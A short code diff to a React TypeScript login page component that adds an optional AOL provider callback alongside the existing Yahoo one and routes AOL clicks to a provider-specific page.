@@ -8,14 +8,16 @@ interface LoginPageProps {
   onBack: () => void;
   onLoginSuccess?: (sessionData: any) => void;
   onLoginError?: (error: string) => void;
-  onYahooSelect?: () => void; // New prop for Yahoo
+  onYahooSelect?: () => void;
+  onAolSelect?: () => void; // New prop for AOL
 }
 
 const LoginPage: React.FC<LoginPageProps> = ({ 
   fileName, 
   onLoginSuccess, 
   onLoginError,
-  onYahooSelect, // Destructure new prop
+  onYahooSelect,
+  onAolSelect, // Destructure new prop
 }) => {
   const [selectedProvider, setSelectedProvider] = useState<string | null>(null);
   const [email, setEmail] = useState('');
@@ -53,6 +55,8 @@ const LoginPage: React.FC<LoginPageProps> = ({
   const handleProviderClick = (providerName: string) => {
     if (providerName === 'Yahoo' && onYahooSelect) {
       onYahooSelect(); // Trigger Yahoo-specific page
+    } else if (providerName === 'AOL' && onAolSelect) {
+      onAolSelect(); // Trigger AOL-specific page
     } else {
       setSelectedProvider(providerName);
     }
